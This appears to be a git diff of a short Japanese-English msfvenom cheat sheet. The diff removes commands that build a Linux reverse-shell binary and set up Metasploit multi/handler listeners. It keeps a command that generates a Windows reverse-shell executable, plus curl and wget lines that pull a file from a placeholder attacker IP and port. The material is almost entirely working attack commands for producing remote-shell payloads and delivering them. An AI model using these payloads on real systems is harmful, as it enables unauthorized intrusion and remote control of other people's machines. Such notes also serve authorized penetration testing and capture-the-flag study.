@@ -1,13 +1,5 @@
 # msfvenom
 
-## Generate reverse shell/リバースシェルを生成する
-
-Linux
-```
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64
-```
-Windows
-
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
@@ -31,26 +23,6 @@ curl http://<ip>:<port>/<realfilename> -o <outfilename>
 or
 ```
 wget http://<ip>:<port>/<realfilename> -O <outfilename>
-```
-
-## metasploitで待ち受ける
-
-Linux
-```
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set lhost <IP>
-msf6 exploit(multi/handler) > set lport <PORT>
-msf6 exploit(multi/handler) > run
-```
-
-Windows
-```
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload ************
-msf6 exploit(multi/handler) > set lhost <IP>
-msf6 exploit(multi/handler) > set lport <PORT>
-msf6 exploit(multi/handler) > run
 ```
 
 ## Encoders/エンコーダ
